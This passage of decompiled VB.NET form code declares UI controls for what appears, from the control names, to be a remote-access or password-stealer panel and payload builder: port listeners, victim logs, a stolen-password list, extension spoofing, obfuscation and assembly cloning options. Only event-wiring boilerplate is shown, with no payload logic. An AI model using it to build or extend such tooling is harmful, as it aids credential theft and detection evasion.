				Dim value2 As EventHandler = AddressOf Me.StartPort_Click
				Dim startPort As Guna2GradientButton = Me._StartPort
				If startPort IsNot Nothing Then
					RemoveHandler startPort.Click, value2
				End If
				Me._StartPort = value
				startPort = Me._StartPort
				If startPort IsNot Nothing Then
					AddHandler startPort.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000454 RID: 1108
		' (get) Token: 0x06000A8F RID: 2703 RVA: 0x0006E10F File Offset: 0x0006C30F
		' (set) Token: 0x06000A90 RID: 2704 RVA: 0x0006E119 File Offset: 0x0006C319
		Friend Overridable Property PortsListBox As UIListBox

		' Token: 0x17000455 RID: 1109
		' (get) Token: 0x06000A91 RID: 2705 RVA: 0x0006E122 File Offset: 0x0006C322
		' (set) Token: 0x06000A92 RID: 2706 RVA: 0x0006E12C File Offset: 0x0006C32C
		Friend Overridable Property Guna2HtmlLabel4 As Guna2HtmlLabel

		' Token: 0x17000456 RID: 1110
		' (get) Token: 0x06000A93 RID: 2707 RVA: 0x0006E135 File Offset: 0x0006C335
		' (set) Token: 0x06000A94 RID: 2708 RVA: 0x0006E13F File Offset: 0x0006C33F
		Friend Overridable Property NumPort As Guna2HtmlLabel

		' Token: 0x17000457 RID: 1111
		' (get) Token: 0x06000A95 RID: 2709 RVA: 0x0006E148 File Offset: 0x0006C348
		' (set) Token: 0x06000A96 RID: 2710 RVA: 0x0006E152 File Offset: 0x0006C352
		Friend Overridable Property ProgPortsBar As Guna2CircleProgressBar

		' Token: 0x17000458 RID: 1112
		' (get) Token: 0x06000A97 RID: 2711 RVA: 0x0006E15B File Offset: 0x0006C35B
		' (set) Token: 0x06000A98 RID: 2712 RVA: 0x0006E165 File Offset: 0x0006C365
		Friend Overridable Property Falgs As DataGridViewImageColumn

		' Token: 0x17000459 RID: 1113
		' (get) Token: 0x06000A99 RID: 2713 RVA: 0x0006E16E File Offset: 0x0006C36E
		' (set) Token: 0x06000A9A RID: 2714 RVA: 0x0006E178 File Offset: 0x0006C378
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x1700045A RID: 1114
		' (get) Token: 0x06000A9B RID: 2715 RVA: 0x0006E181 File Offset: 0x0006C381
		' (set) Token: 0x06000A9C RID: 2716 RVA: 0x0006E18B File Offset: 0x0006C38B
		Friend Overridable Property Column21 As DataGridViewTextBoxColumn

		' Token: 0x1700045B RID: 1115
		' (get) Token: 0x06000A9D RID: 2717 RVA: 0x0006E194 File Offset: 0x0006C394
		' (set) Token: 0x06000A9E RID: 2718 RVA: 0x0006E19E File Offset: 0x0006C39E
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x1700045C RID: 1116
		' (get) Token: 0x06000A9F RID: 2719 RVA: 0x0006E1A7 File Offset: 0x0006C3A7
		' (set) Token: 0x06000AA0 RID: 2720 RVA: 0x0006E1B1 File Offset: 0x0006C3B1
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x1700045D RID: 1117
		' (get) Token: 0x06000AA1 RID: 2721 RVA: 0x0006E1BA File Offset: 0x0006C3BA
		' (set) Token: 0x06000AA2 RID: 2722 RVA: 0x0006E1C4 File Offset: 0x0006C3C4
		Friend Overridable Property Column7 As DataGridViewTextBoxColumn

		' Token: 0x1700045E RID: 1118
		' (get) Token: 0x06000AA3 RID: 2723 RVA: 0x0006E1CD File Offset: 0x0006C3CD
		' (set) Token: 0x06000AA4 RID: 2724 RVA: 0x0006E1D7 File Offset: 0x0006C3D7
		Friend Overridable Property Column1 As DataGridViewImageColumn

		' Token: 0x1700045F RID: 1119
		' (get) Token: 0x06000AA5 RID: 2725 RVA: 0x0006E1E0 File Offset: 0x0006C3E0
		' (set) Token: 0x06000AA6 RID: 2726 RVA: 0x0006E1EA File Offset: 0x0006C3EA
		Friend Overridable Property CurrencyL1 As DataGridView

		' Token: 0x17000460 RID: 1120
		' (get) Token: 0x06000AA7 RID: 2727 RVA: 0x0006E1F3 File Offset: 0x0006C3F3
		' (set) Token: 0x06000AA8 RID: 2728 RVA: 0x0006E1FD File Offset: 0x0006C3FD
		Friend Overridable Property DataGridViewLogs As DataGridView

		' Token: 0x17000461 RID: 1121
		' (get) Token: 0x06000AA9 RID: 2729 RVA: 0x0006E206 File Offset: 0x0006C406
		' (set) Token: 0x06000AAA RID: 2730 RVA: 0x0006E210 File Offset: 0x0006C410
		Friend Overridable Property ListPassword As DataGridView

		' Token: 0x17000462 RID: 1122
		' (get) Token: 0x06000AAB RID: 2731 RVA: 0x0006E219 File Offset: 0x0006C419
		' (set) Token: 0x06000AAC RID: 2732 RVA: 0x0006E223 File Offset: 0x0006C423
		Friend Overridable Property DataGridViewImageColumn3 As DataGridViewImageColumn

		' Token: 0x17000463 RID: 1123
		' (get) Token: 0x06000AAD RID: 2733 RVA: 0x0006E22C File Offset: 0x0006C42C
		' (set) Token: 0x06000AAE RID: 2734 RVA: 0x0006E236 File Offset: 0x0006C436
		Friend Overridable Property DataGridViewTextBoxColumn3 As DataGridViewTextBoxColumn

		' Token: 0x17000464 RID: 1124
		' (get) Token: 0x06000AAF RID: 2735 RVA: 0x0006E23F File Offset: 0x0006C43F
		' (set) Token: 0x06000AB0 RID: 2736 RVA: 0x0006E249 File Offset: 0x0006C449
		Friend Overridable Property DataGridViewTextBoxColumn6 As DataGridViewTextBoxColumn

		' Token: 0x17000465 RID: 1125
		' (get) Token: 0x06000AB1 RID: 2737 RVA: 0x0006E252 File Offset: 0x0006C452
		' (set) Token: 0x06000AB2 RID: 2738 RVA: 0x0006E25C File Offset: 0x0006C45C
		Friend Overridable Property DataGridViewTextBoxColumn7 As DataGridViewTextBoxColumn

		' Token: 0x17000466 RID: 1126
		' (get) Token: 0x06000AB3 RID: 2739 RVA: 0x0006E265 File Offset: 0x0006C465
		' (set) Token: 0x06000AB4 RID: 2740 RVA: 0x0006E26F File Offset: 0x0006C46F
		Friend Overridable Property PasswordContextMenuStrip As ContextMenuStrip

		' Token: 0x17000467 RID: 1127
		' (get) Token: 0x06000AB5 RID: 2741 RVA: 0x0006E278 File Offset: 0x0006C478
		' (set) Token: 0x06000AB6 RID: 2742 RVA: 0x0006E284 File Offset: 0x0006C484
		Friend Overridable Property RecoveryPassword As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RecoveryPassword
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RecoveryPassword_Click
				Dim recoveryPassword As ToolStripMenuItem = Me._RecoveryPassword
				If recoveryPassword IsNot Nothing Then
					RemoveHandler recoveryPassword.Click, value2
				End If
				Me._RecoveryPassword = value
				recoveryPassword = Me._RecoveryPassword
				If recoveryPassword IsNot Nothing Then
					AddHandler recoveryPassword.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000468 RID: 1128
		' (get) Token: 0x06000AB7 RID: 2743 RVA: 0x0006E2C7 File Offset: 0x0006C4C7
		' (set) Token: 0x06000AB8 RID: 2744 RVA: 0x0006E2D4 File Offset: 0x0006C4D4
		Friend Overridable Property DeletePassword As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DeletePassword
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeletePassword_Click
				Dim deletePassword As ToolStripMenuItem = Me._DeletePassword
				If deletePassword IsNot Nothing Then
					RemoveHandler deletePassword.Click, value2
				End If
				Me._DeletePassword = value
				deletePassword = Me._DeletePassword
				If deletePassword IsNot Nothing Then
					AddHandler deletePassword.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000469 RID: 1129
		' (get) Token: 0x06000AB9 RID: 2745 RVA: 0x0006E317 File Offset: 0x0006C517
		' (set) Token: 0x06000ABA RID: 2746 RVA: 0x0006E321 File Offset: 0x0006C521
		Friend Overridable Property ImageListLogs As ImageList

		' Token: 0x1700046A RID: 1130
		' (get) Token: 0x06000ABB RID: 2747 RVA: 0x0006E32A File Offset: 0x0006C52A
		' (set) Token: 0x06000ABC RID: 2748 RVA: 0x0006E334 File Offset: 0x0006C534
		Friend Overridable Property ObfusctionXX As Guna2GroupBox

		' Token: 0x1700046B RID: 1131
		' (get) Token: 0x06000ABD RID: 2749 RVA: 0x0006E33D File Offset: 0x0006C53D
		' (set) Token: 0x06000ABE RID: 2750 RVA: 0x0006E347 File Offset: 0x0006C547
		Friend Overridable Property Label25 As Label

		' Token: 0x1700046C RID: 1132
		' (get) Token: 0x06000ABF RID: 2751 RVA: 0x0006E350 File Offset: 0x0006C550
		' (set) Token: 0x06000AC0 RID: 2752 RVA: 0x0006E35A File Offset: 0x0006C55A
		Friend Overridable Property PictureBox6 As System.Windows.Forms.PictureBox

		' Token: 0x1700046D RID: 1133
		' (get) Token: 0x06000AC1 RID: 2753 RVA: 0x0006E363 File Offset: 0x0006C563
		' (set) Token: 0x06000AC2 RID: 2754 RVA: 0x0006E36D File Offset: 0x0006C56D
		Friend Overridable Property PictureBox62 As System.Windows.Forms.PictureBox

		' Token: 0x1700046E RID: 1134
		' (get) Token: 0x06000AC3 RID: 2755 RVA: 0x0006E376 File Offset: 0x0006C576
		' (set) Token: 0x06000AC4 RID: 2756 RVA: 0x0006E380 File Offset: 0x0006C580
		Friend Overridable Property Guna2HtmlLabel8 As Guna2HtmlLabel

		' Token: 0x1700046F RID: 1135
		' (get) Token: 0x06000AC5 RID: 2757 RVA: 0x0006E389 File Offset: 0x0006C589
		' (set) Token: 0x06000AC6 RID: 2758 RVA: 0x0006E393 File Offset: 0x0006C593
		Friend Overridable Property Guna2HtmlLabel11 As Guna2HtmlLabel

		' Token: 0x17000470 RID: 1136
		' (get) Token: 0x06000AC7 RID: 2759 RVA: 0x0006E39C File Offset: 0x0006C59C
		' (set) Token: 0x06000AC8 RID: 2760 RVA: 0x0006E3A6 File Offset: 0x0006C5A6
		Friend Overridable Property Guna2GroupBox33 As Guna2GroupBox

		' Token: 0x17000471 RID: 1137
		' (get) Token: 0x06000AC9 RID: 2761 RVA: 0x0006E3AF File Offset: 0x0006C5AF
		' (set) Token: 0x06000ACA RID: 2762 RVA: 0x0006E3BC File Offset: 0x0006C5BC
		Friend Overridable Property Spoofing As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Spoofing
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Spoofing_CheckedChanged
				Dim spoofing As Guna2ToggleSwitch = Me._Spoofing
				If spoofing IsNot Nothing Then
					RemoveHandler spoofing.CheckedChanged, value2
				End If
				Me._Spoofing = value
				spoofing = Me._Spoofing
				If spoofing IsNot Nothing Then
					AddHandler spoofing.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000472 RID: 1138
		' (get) Token: 0x06000ACB RID: 2763 RVA: 0x0006E3FF File Offset: 0x0006C5FF
		' (set) Token: 0x06000ACC RID: 2764 RVA: 0x0006E409 File Offset: 0x0006C609
		Friend Overridable Property Label52 As Label

		' Token: 0x17000473 RID: 1139
		' (get) Token: 0x06000ACD RID: 2765 RVA: 0x0006E412 File Offset: 0x0006C612
		' (set) Token: 0x06000ACE RID: 2766 RVA: 0x0006E41C File Offset: 0x0006C61C
		Friend Overridable Property Label53 As Label

		' Token: 0x17000474 RID: 1140
		' (get) Token: 0x06000ACF RID: 2767 RVA: 0x0006E425 File Offset: 0x0006C625
		' (set) Token: 0x06000AD0 RID: 2768 RVA: 0x0006E42F File Offset: 0x0006C62F
		Friend Overridable Property PictureBox57 As System.Windows.Forms.PictureBox

		' Token: 0x17000475 RID: 1141
		' (get) Token: 0x06000AD1 RID: 2769 RVA: 0x0006E438 File Offset: 0x0006C638
		' (set) Token: 0x06000AD2 RID: 2770 RVA: 0x0006E442 File Offset: 0x0006C642
		Friend Overridable Property Guna2GroupBox31 As Guna2GroupBox

		' Token: 0x17000476 RID: 1142
		' (get) Token: 0x06000AD3 RID: 2771 RVA: 0x0006E44B File Offset: 0x0006C64B
		' (set) Token: 0x06000AD4 RID: 2772 RVA: 0x0006E455 File Offset: 0x0006C655
		Friend Overridable Property GB As UIRadioButton

		' Token: 0x17000477 RID: 1143
		' (get) Token: 0x06000AD5 RID: 2773 RVA: 0x0006E45E File Offset: 0x0006C65E
		' (set) Token: 0x06000AD6 RID: 2774 RVA: 0x0006E468 File Offset: 0x0006C668
		Friend Overridable Property MB As UIRadioButton

		' Token: 0x17000478 RID: 1144
		' (get) Token: 0x06000AD7 RID: 2775 RVA: 0x0006E471 File Offset: 0x0006C671
		' (set) Token: 0x06000AD8 RID: 2776 RVA: 0x0006E47B File Offset: 0x0006C67B
		Friend Overridable Property SizeValue As Guna2NumericUpDown

		' Token: 0x17000479 RID: 1145
		' (get) Token: 0x06000AD9 RID: 2777 RVA: 0x0006E484 File Offset: 0x0006C684
		' (set) Token: 0x06000ADA RID: 2778 RVA: 0x0006E48E File Offset: 0x0006C68E
		Friend Overridable Property Label48 As Label

		' Token: 0x1700047A RID: 1146
		' (get) Token: 0x06000ADB RID: 2779 RVA: 0x0006E497 File Offset: 0x0006C697
		' (set) Token: 0x06000ADC RID: 2780 RVA: 0x0006E4A1 File Offset: 0x0006C6A1
		Friend Overridable Property PictureBox58 As System.Windows.Forms.PictureBox

		' Token: 0x1700047B RID: 1147
		' (get) Token: 0x06000ADD RID: 2781 RVA: 0x0006E4AA File Offset: 0x0006C6AA
		' (set) Token: 0x06000ADE RID: 2782 RVA: 0x0006E4B4 File Offset: 0x0006C6B4
		Friend Overridable Property EnabledSize As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnabledSize
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnabledSize_CheckedChanged
				Dim enabledSize As Guna2ToggleSwitch = Me._EnabledSize
				If enabledSize IsNot Nothing Then
					RemoveHandler enabledSize.CheckedChanged, value2
				End If
				Me._EnabledSize = value
				enabledSize = Me._EnabledSize
				If enabledSize IsNot Nothing Then
					AddHandler enabledSize.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700047C RID: 1148
		' (get) Token: 0x06000ADF RID: 2783 RVA: 0x0006E4F7 File Offset: 0x0006C6F7
		' (set) Token: 0x06000AE0 RID: 2784 RVA: 0x0006E501 File Offset: 0x0006C701
		Friend Overridable Property Label49 As Label

		' Token: 0x1700047D RID: 1149
		' (get) Token: 0x06000AE1 RID: 2785 RVA: 0x0006E50A File Offset: 0x0006C70A
		' (set) Token: 0x06000AE2 RID: 2786 RVA: 0x0006E514 File Offset: 0x0006C714
		Friend Overridable Property Guna2GroupBox36 As Guna2GroupBox

		' Token: 0x1700047E RID: 1150
		' (get) Token: 0x06000AE3 RID: 2787 RVA: 0x0006E51D File Offset: 0x0006C71D
		' (set) Token: 0x06000AE4 RID: 2788 RVA: 0x0006E527 File Offset: 0x0006C727
		Friend Overridable Property Label21 As Label

		' Token: 0x1700047F RID: 1151
		' (get) Token: 0x06000AE5 RID: 2789 RVA: 0x0006E530 File Offset: 0x0006C730
		' (set) Token: 0x06000AE6 RID: 2790 RVA: 0x0006E53A File Offset: 0x0006C73A
		Friend Overridable Property SaveBuilderInfo As Guna2ToggleSwitch

		' Token: 0x17000480 RID: 1152
		' (get) Token: 0x06000AE7 RID: 2791 RVA: 0x0006E543 File Offset: 0x0006C743
		' (set) Token: 0x06000AE8 RID: 2792 RVA: 0x0006E54D File Offset: 0x0006C74D
		Friend Overridable Property Label57 As Label

		' Token: 0x17000481 RID: 1153
		' (get) Token: 0x06000AE9 RID: 2793 RVA: 0x0006E556 File Offset: 0x0006C756
		' (set) Token: 0x06000AEA RID: 2794 RVA: 0x0006E560 File Offset: 0x0006C760
		Friend Overridable Property PictureBox63 As System.Windows.Forms.PictureBox

		' Token: 0x17000482 RID: 1154
		' (get) Token: 0x06000AEB RID: 2795 RVA: 0x0006E569 File Offset: 0x0006C769
		' (set) Token: 0x06000AEC RID: 2796 RVA: 0x0006E573 File Offset: 0x0006C773
		Friend Overridable Property Guna2GroupBox35 As Guna2GroupBox

		' Token: 0x17000483 RID: 1155
		' (get) Token: 0x06000AED RID: 2797 RVA: 0x0006E57C File Offset: 0x0006C77C
		' (set) Token: 0x06000AEE RID: 2798 RVA: 0x0006E586 File Offset: 0x0006C786
		Friend Overridable Property Label50 As Label

		' Token: 0x17000484 RID: 1156
		' (get) Token: 0x06000AEF RID: 2799 RVA: 0x0006E58F File Offset: 0x0006C78F
		' (set) Token: 0x06000AF0 RID: 2800 RVA: 0x0006E599 File Offset: 0x0006C799
		Friend Overridable Property Label54 As Label

		' Token: 0x17000485 RID: 1157
		' (get) Token: 0x06000AF1 RID: 2801 RVA: 0x0006E5A2 File Offset: 0x0006C7A2
		' (set) Token: 0x06000AF2 RID: 2802 RVA: 0x0006E5AC File Offset: 0x0006C7AC
		Friend Overridable Property PictureBox60 As System.Windows.Forms.PictureBox

		' Token: 0x17000486 RID: 1158
		' (get) Token: 0x06000AF3 RID: 2803 RVA: 0x0006E5B5 File Offset: 0x0006C7B5
		' (set) Token: 0x06000AF4 RID: 2804 RVA: 0x0006E5BF File Offset: 0x0006C7BF
		Friend Overridable Property KB As UIRadioButton

		' Token: 0x17000487 RID: 1159
		' (get) Token: 0x06000AF5 RID: 2805 RVA: 0x0006E5C8 File Offset: 0x0006C7C8
		' (set) Token: 0x06000AF6 RID: 2806 RVA: 0x0006E5D2 File Offset: 0x0006C7D2
		Friend Overridable Property PasswordsEnable As Guna2ToggleSwitch

		' Token: 0x17000488 RID: 1160
		' (get) Token: 0x06000AF7 RID: 2807 RVA: 0x0006E5DB File Offset: 0x0006C7DB
		' (set) Token: 0x06000AF8 RID: 2808 RVA: 0x0006E5E5 File Offset: 0x0006C7E5
		Friend Overridable Property Guna2GroupBox30 As Guna2GroupBox

		' Token: 0x17000489 RID: 1161
		' (get) Token: 0x06000AF9 RID: 2809 RVA: 0x0006E5EE File Offset: 0x0006C7EE
		' (set) Token: 0x06000AFA RID: 2810 RVA: 0x0006E5F8 File Offset: 0x0006C7F8
		Friend Overridable Property Label56 As Label

		' Token: 0x1700048A RID: 1162
		' (get) Token: 0x06000AFB RID: 2811 RVA: 0x0006E601 File Offset: 0x0006C801
		' (set) Token: 0x06000AFC RID: 2812 RVA: 0x0006E60C File Offset: 0x0006C80C
		Friend Overridable Property EnabledAssembly As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnabledAssembly
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnabledAssembly_CheckedChanged
				Dim enabledAssembly As Guna2ToggleSwitch = Me._EnabledAssembly
				If enabledAssembly IsNot Nothing Then
					RemoveHandler enabledAssembly.CheckedChanged, value2
				End If
				Me._EnabledAssembly = value
				enabledAssembly = Me._EnabledAssembly
				If enabledAssembly IsNot Nothing Then
					AddHandler enabledAssembly.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700048B RID: 1163
		' (get) Token: 0x06000AFD RID: 2813 RVA: 0x0006E64F File Offset: 0x0006C84F
		' (set) Token: 0x06000AFE RID: 2814 RVA: 0x0006E659 File Offset: 0x0006C859
		Friend Overridable Property Label24 As Label

		' Token: 0x1700048C RID: 1164
		' (get) Token: 0x06000AFF RID: 2815 RVA: 0x0006E662 File Offset: 0x0006C862
		' (set) Token: 0x06000B00 RID: 2816 RVA: 0x0006E66C File Offset: 0x0006C86C
		Friend Overridable Property TitleAssembly As Guna2TextBox

		' Token: 0x1700048D RID: 1165
		' (get) Token: 0x06000B01 RID: 2817 RVA: 0x0006E675 File Offset: 0x0006C875
		' (set) Token: 0x06000B02 RID: 2818 RVA: 0x0006E680 File Offset: 0x0006C880
		Friend Overridable Property Enabled_Icon As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Enabled_Icon
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Enabled_Icon_CheckedChanged
				Dim enabled_Icon As Guna2ToggleSwitch = Me._Enabled_Icon
				If enabled_Icon IsNot Nothing Then
					RemoveHandler enabled_Icon.CheckedChanged, value2
				End If
				Me._Enabled_Icon = value
				enabled_Icon = Me._Enabled_Icon
				If enabled_Icon IsNot Nothing Then
					AddHandler enabled_Icon.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700048E RID: 1166
		' (get) Token: 0x06000B03 RID: 2819 RVA: 0x0006E6C3 File Offset: 0x0006C8C3
		' (set) Token: 0x06000B04 RID: 2820 RVA: 0x0006E6CD File Offset: 0x0006C8CD
		Friend Overridable Property Label47 As Label

		' Token: 0x1700048F RID: 1167
		' (get) Token: 0x06000B05 RID: 2821 RVA: 0x0006E6D6 File Offset: 0x0006C8D6
		' (set) Token: 0x06000B06 RID: 2822 RVA: 0x0006E6E0 File Offset: 0x0006C8E0
		Friend Overridable Property PictureBox_Icons As System.Windows.Forms.PictureBox

		' Token: 0x17000490 RID: 1168
		' (get) Token: 0x06000B07 RID: 2823 RVA: 0x0006E6E9 File Offset: 0x0006C8E9
		' (set) Token: 0x06000B08 RID: 2824 RVA: 0x0006E6F4 File Offset: 0x0006C8F4
		Friend Overridable Property Chose_Icon As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Chose_Icon
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Chose_Icon_Click
				Dim chose_Icon As Guna2GradientButton = Me._Chose_Icon
				If chose_Icon IsNot Nothing Then
					RemoveHandler chose_Icon.Click, value2
				End If
				Me._Chose_Icon = value
				chose_Icon = Me._Chose_Icon
				If chose_Icon IsNot Nothing Then
					AddHandler chose_Icon.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000491 RID: 1169
		' (get) Token: 0x06000B09 RID: 2825 RVA: 0x0006E737 File Offset: 0x0006C937
		' (set) Token: 0x06000B0A RID: 2826 RVA: 0x0006E744 File Offset: 0x0006C944
		Friend Overridable Property CloneAssembly As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._CloneAssembly
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.CloneAssembly_Click
				Dim cloneAssembly As Guna2GradientButton = Me._CloneAssembly
				If cloneAssembly IsNot Nothing Then
					RemoveHandler cloneAssembly.Click, value2
				End If
				Me._CloneAssembly = value
				cloneAssembly = Me._CloneAssembly
				If cloneAssembly IsNot Nothing Then
					AddHandler cloneAssembly.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000492 RID: 1170
		' (get) Token: 0x06000B0B RID: 2827 RVA: 0x0006E787 File Offset: 0x0006C987
		' (set) Token: 0x06000B0C RID: 2828 RVA: 0x0006E791 File Offset: 0x0006C991
		Friend Overridable Property TrademarksAssembly As Guna2TextBox

		' Token: 0x17000493 RID: 1171
		' (get) Token: 0x06000B0D RID: 2829 RVA: 0x0006E79A File Offset: 0x0006C99A
		' (set) Token: 0x06000B0E RID: 2830 RVA: 0x0006E7A4 File Offset: 0x0006C9A4
		Friend Overridable Property CopyrightAssembly As Guna2TextBox

		' Token: 0x17000494 RID: 1172
		' (get) Token: 0x06000B0F RID: 2831 RVA: 0x0006E7AD File Offset: 0x0006C9AD
		' (set) Token: 0x06000B10 RID: 2832 RVA: 0x0006E7B7 File Offset: 0x0006C9B7
		Friend Overridable Property DescriptionsAssembly As Guna2TextBox

		' Token: 0x17000495 RID: 1173
		' (get) Token: 0x06000B11 RID: 2833 RVA: 0x0006E7C0 File Offset: 0x0006C9C0
		' (set) Token: 0x06000B12 RID: 2834 RVA: 0x0006E7CA File Offset: 0x0006C9CA
		Friend Overridable Property Versions3 As Guna2NumericUpDown

		' Token: 0x17000496 RID: 1174
		' (get) Token: 0x06000B13 RID: 2835 RVA: 0x0006E7D3 File Offset: 0x0006C9D3
		' (set) Token: 0x06000B14 RID: 2836 RVA: 0x0006E7DD File Offset: 0x0006C9DD
		Friend Overridable Property CompanyAssembly As Guna2TextBox

		' Token: 0x17000497 RID: 1175
		' (get) Token: 0x06000B15 RID: 2837 RVA: 0x0006E7E6 File Offset: 0x0006C9E6
		' (set) Token: 0x06000B16 RID: 2838 RVA: 0x0006E7F0 File Offset: 0x0006C9F0
		Friend Overridable Property Versions1 As Guna2NumericUpDown

		' Token: 0x17000498 RID: 1176
		' (get) Token: 0x06000B17 RID: 2839 RVA: 0x0006E7F9 File Offset: 0x0006C9F9
		' (set) Token: 0x06000B18 RID: 2840 RVA: 0x0006E803 File Offset: 0x0006CA03
		Friend Overridable Property Versions4 As Guna2NumericUpDown

		' Token: 0x17000499 RID: 1177
		' (get) Token: 0x06000B19 RID: 2841 RVA: 0x0006E80C File Offset: 0x0006CA0C
		' (set) Token: 0x06000B1A RID: 2842 RVA: 0x0006E816 File Offset: 0x0006CA16
		Friend Overridable Property Versions2 As Guna2NumericUpDown

		' Token: 0x1700049A RID: 1178
		' (get) Token: 0x06000B1B RID: 2843 RVA: 0x0006E81F File Offset: 0x0006CA1F
		' (set) Token: 0x06000B1C RID: 2844 RVA: 0x0006E829 File Offset: 0x0006CA29
		Friend Overridable Property Guna2HtmlLabel5 As Guna2HtmlLabel

		' Token: 0x1700049B RID: 1179
		' (get) Token: 0x06000B1D RID: 2845 RVA: 0x0006E832 File Offset: 0x0006CA32
		' (set) Token: 0x06000B1E RID: 2846 RVA: 0x0006E83C File Offset: 0x0006CA3C
		Friend Overridable Property Icon_Filename As Guna2TextBox

		' Token: 0x1700049C RID: 1180
		' (get) Token: 0x06000B1F RID: 2847 RVA: 0x0006E845 File Offset: 0x0006CA45
		' (set) Token: 0x06000B20 RID: 2848 RVA: 0x0006E84F File Offset: 0x0006CA4F
		Private Overridable Property SpoofingText As Guna2ComboBox

		' Token: 0x1700049D RID: 1181
		' (get) Token: 0x06000B21 RID: 2849 RVA: 0x0006E858 File Offset: 0x0006CA58
		' (set) Token: 0x06000B22 RID: 2850 RVA: 0x0006E862 File Offset: 0x0006CA62
		Private Overridable Property ObfusctionComboBox As Guna2ComboBox

		' Token: 0x1700049E RID: 1182
		' (get) Token: 0x06000B23 RID: 2851 RVA: 0x0006E86B File Offset: 0x0006CA6B
		' (set) Token: 0x06000B24 RID: 2852 RVA: 0x0006E875 File Offset: 0x0006CA75
		Friend Overridable Property Guna2GroupBox32 As Guna2GroupBox

		' Token: 0x1700049F RID: 1183
		' (get) Token: 0x06000B25 RID: 2853 RVA: 0x0006E87E File Offset: 0x0006CA7E
		' (set) Token: 0x06000B26 RID: 2854 RVA: 0x0006E888 File Offset: 0x0006CA88
		Friend Overridable Property Label23 As Label

		' Token: 0x170004A0 RID: 1184
		' (get) Token: 0x06000B27 RID: 2855 RVA: 0x0006E891 File Offset: 0x0006CA91
		' (set) Token: 0x06000B28 RID: 2856 RVA: 0x0006E89B File Offset: 0x0006CA9B
		Friend Overridable Property PictureBox65 As System.Windows.Forms.PictureBox

		' Token: 0x170004A1 RID: 1185
		' (get) Token: 0x06000B29 RID: 2857 RVA: 0x0006E8A4 File Offset: 0x0006CAA4
		' (set) Token: 0x06000B2A RID: 2858 RVA: 0x0006E8B0 File Offset: 0x0006CAB0
		Friend Overridable Property FormPanel As Guna2CustomGradientPanel
			<CompilerGenerated()>
			Get
				Return Me._FormPanel
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2CustomGradientPanel)
				Dim value2 As MouseEventHandler = AddressOf Me.FormPanel_MouseUp
				Dim value3 As MouseEventHandler = AddressOf Me.FormPanel_MouseDown
				Dim value4 As MouseEventHandler = AddressOf Me.FormPanel_MouseMove
				Dim formPanel As Guna2CustomGradientPanel = Me._FormPanel
				If formPanel IsNot Nothing Then
					RemoveHandler formPanel.MouseUp, value2
					RemoveHandler formPanel.MouseDown, value3
					RemoveHandler formPanel.MouseMove, value4
				End If
				Me._FormPanel = value
				formPanel = Me._FormPanel
				If formPanel IsNot Nothing Then
					AddHandler formPanel.MouseUp, value2
					AddHandler formPanel.MouseDown, value3
					AddHandler formPanel.MouseMove, value4
				End If
			End Set
		End Property

		' Token: 0x170004A2 RID: 1186
		' (get) Token: 0x06000B2B RID: 2859 RVA: 0x0006E929 File Offset: 0x0006CB29
		' (set) Token: 0x06000B2C RID: 2860 RVA: 0x0006E933 File Offset: 0x0006CB33
		Friend Overridable Property Guna2CustomGradientPanel3 As Guna2CustomGradientPanel

		' Token: 0x170004A3 RID: 1187
		' (get) Token: 0x06000B2D RID: 2861 RVA: 0x0006E93C File Offset: 0x0006CB3C
		' (set) Token: 0x06000B2E RID: 2862 RVA: 0x0006E946 File Offset: 0x0006CB46
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170004A4 RID: 1188
		' (get) Token: 0x06000B2F RID: 2863 RVA: 0x0006E94F File Offset: 0x0006CB4F
		' (set) Token: 0x06000B30 RID: 2864 RVA: 0x0006E95C File Offset: 0x0006CB5C
		Friend Overridable Property TapHome As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapHome
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
